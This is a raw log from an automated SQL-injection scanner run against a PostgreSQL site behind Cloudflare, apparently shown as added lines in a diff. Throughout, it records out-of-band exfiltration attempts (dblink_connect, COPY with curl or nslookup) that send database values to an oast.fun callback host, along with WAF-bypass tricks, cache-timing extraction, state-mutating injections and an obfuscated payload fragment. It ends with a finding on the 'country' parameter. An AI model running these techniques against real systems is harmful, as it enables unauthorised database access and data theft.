+[+] [Novel] DNS vector 'xml_entity' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'copy_curl' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'lo_export' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'copy_curl' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'lo_export' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'copy_curl' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'lo_export' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] Technique 5: Connection pool exhaustion oracle
+[+] [Novel] Connection exhaustion test: status after lock = 400
+[+] [Novel] Technique 6: Write-then-read (two-stage)
+[+] [Novel]  Write-then-read response: <html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></cente
+[+] [Novel] Technique 7: Response splitting via config/session vars
+[+] [Novel] Technique 8: Conditional error type oracle
+[+] [Novel]  Error type 'cast_fail' viable: TRUE155 FALSE557 (length)
+[+] [Novel]  Error-type database = 󾧇
+[+] [Novel]  Error-type version = 񽗋
+[+] [Novel] Technique 9: Prepared statement keyword bypass
+[+] [Novel] Prepared statements sent for database
+[+] [Novel] Prepared statements sent for version
+[+] [Novel] Technique 10: Application state mutation
+[+] [Novel] State mutation 'table_write' sent for user
+[+] [Novel] State mutation 'comment_inject' sent for user
+[+] [Novel] State mutation 'sequence_name' sent for user
+[+] [Novel] State mutation 'table_write' sent for database
+[+] [Novel] State mutation 'comment_inject' sent for database
+[+] [Novel] State mutation 'sequence_name' sent for database
+[+] [Novel] State mutation 'table_write' sent for version
+[+] [Novel] State mutation 'comment_inject' sent for version
+[+] [Novel] State mutation 'sequence_name' sent for version
+[+] [Novel] Technique 11: TCP/response size inflation
+[+] [Novel]  TCP inflation viable: inflated=155 normal=557
+[+] [Novel] Technique 12: Nested/multi-layer encoding bypass
+[+] [Novel] Technique 13: Conditional redirect detection
+[+] [Novel]  No redirect differentiation
+[+] [Novel] Technique 14: Cache key manipulation
+[+] [Novel]  Cache oracle: hit=236ms miss=1245ms margin=1009ms
+[+] [Novel]  FIX #5: EXPLOITING CACHE ORACLE 
+[+] [Novel] Using cache timing for data extraction (margin=1009ms)
+[+] [Novel] Cache threshold: 740ms (baseline=236ms, margin=1009ms)
+[+] [Novel] Cache extraction progress: -
+[+] [Novel] Cache extraction progress: -i
+[+] [Novel] Cache extraction incomplete or failed
+[+] [Novel] Technique 15: CHR() keyword bypass
+[+] [Novel] CHR() bypass sent for version
+[+] [SideChannel]  Extracting via side channels 
+[SideChannel] Auto-registered OOB domain: dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[SideChannel] DNS OOB: version()  dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[SideChannel] Sending 5 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=403 (388ms) (WAF-blocked)
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=403 (165ms) (WAF-blocked)
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=403 (198ms) (WAF-blocked)
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=403 (247ms) (WAF-blocked)
+[SideChannel]   pg_notify: pg_notify (needs listener)
+[SideChannel]     status=403 (206ms) (WAF-blocked)
+[SideChannel]  All OOB methods blocked (status=400/403) — skipping DNS poll (no payload reached server)
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.dcxefnvzcedmzbelqrzi2mqtjwbwfc 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_catalog  dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[SideChannel] Sending 5 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=403 (201ms) (WAF-blocked)
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=403 (234ms) (WAF-blocked)
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=403 (252ms) (WAF-blocked)
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=403 (201ms) (WAF-blocked)
+[SideChannel]   pg_notify: pg_notify (needs listener)
+[SideChannel]     status=403 (170ms) (WAF-blocked)
+[SideChannel]  All OOB methods blocked (status=400/403) — skipping DNS poll (no payload reached server)
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.dcxefnvzcedmzbelqrzi2mqtjwbwfc 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_user  dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[SideChannel] Sending 5 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=403 (185ms) (WAF-blocked)
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=403 (202ms) (WAF-blocked)
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=403 (221ms) (WAF-blocked)
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=403 (213ms) (WAF-blocked)
+[SideChannel]   pg_notify: pg_notify (needs listener)
+[SideChannel]     status=403 (238ms) (WAF-blocked)
+[SideChannel]  All OOB methods blocked (status=400/403) — skipping DNS poll (no payload reached server)
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.dcxefnvzcedmzbelqrzi2mqtjwbwfc 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[+] [SideChannel]  Side-channel found no data  MSE will try next 
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=162ms)...
+[MSE]   untampered: /*X-FWD: 127.0.0.1*/E%((27))( A N D CHR (((97)) )::IN TEGERN...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]   err(div0): err403/237455B ok403/237455B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/8 oracles available: []
+[+]   Tables (main): (none found)
+[!] --dump: no target table found; specify --table
+[+] [MSE] Standard extraction failed  trying MultiStrategyExtractor...
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=199ms)...
+[MSE]   untampered: /*X-FWD: 127.0.0.1*/E%((27))( A N D CHR (((97)) )::IN TEGERN...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]  [Boolean] body-diff gap=0B < 50B minimum — body-diff oracle not viable
+[MSE]   err(div0): err400/49B ok400/49B
+[MSE]   err(div0): header diff on 'x-request-id'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]  error_oracle basic validation FAILED (1=1False, 1=2False)
+[MSE] 0/8 oracles available: []
+[+] --- Auto-extraction complete ---
+[*] Extraction completed for 'country'
+[+] 
+
+[+] Scan complete   1253.56s
+[+] Requests sent   1569
+[+] DBMS            PostgreSQL
+[+] WAF             Cloudflare
+[+] Vulnerabilities 1 (country)
+[+] 
+[+] Report: 1 findings, 1 unique root causes
+[+] Report  output/sqlreaper_0f8c83a176443ae4_1784653772.json
+[+] Executive summary  output/executive_summary.txt
+[+] Confidence matrix  output/confidence_matrix.md
+[+] [Session] Scan complete  saved session cleared
+[+] Response dedup hit rate: 0.0%
+[+] Markdown report  output/sqlreaper_0f8c83a176443ae4.md
+[+] v19 post-processing complete  1 finding(s), params_scanned1, bandit: {'E': {'mean': 0.333, 'pulls': 1, 'alpha': 1.0, 'beta': 2.0}, 'B': {'mean': 0.333, 'pulls': 1, 'alpha': 1.0, 'beta': 2.0}, 'U': {'mean': 0.333, 'pulls': 1, 'alpha': 1.0, 'beta': 2.0}, 'T': {'mean': 0.5, 'pulls': 0, 'alpha': 1.0, 'beta': 1.0}, 'S': {'mean': 0.5, 'pulls': 0, 'alpha': 1.0, 'beta': 1.0}, 'O': {'mean': 0.5, 'pulls': 0, 'alpha': 1.0, 'beta': 1.0}}, calibrator_pairs: 1, trigram_vocab: 3682
+[+] [PayloadStats] {'total_payloads': 16203, 'by_dbms': {'MySQL': 3203, 'PostgreSQL': 2926, 'Oracle': 2285, 'MSSQL': 2121, 'SQLite': 2465, 'MariaDB': 3203}, 'by_technique': {'B': 1800, 'E': 2220, 'T': 1290, 'S': 1303, 'U': 1650, 'ST': 1793, 'WB': 1800, 'NV': 1514, 'EX': 1280, 'HY': 1553}, 'by_category': {'Boolean': 1800, 'Error': 2220, 'Timebased': 1290, 'Stacked': 1303, 'Union': 1650, 'Standard': 1793, 'WAFBypass': 1800, 'Novel': 1514, 'Exotic': 1280, 'Hybrid': 1553}}
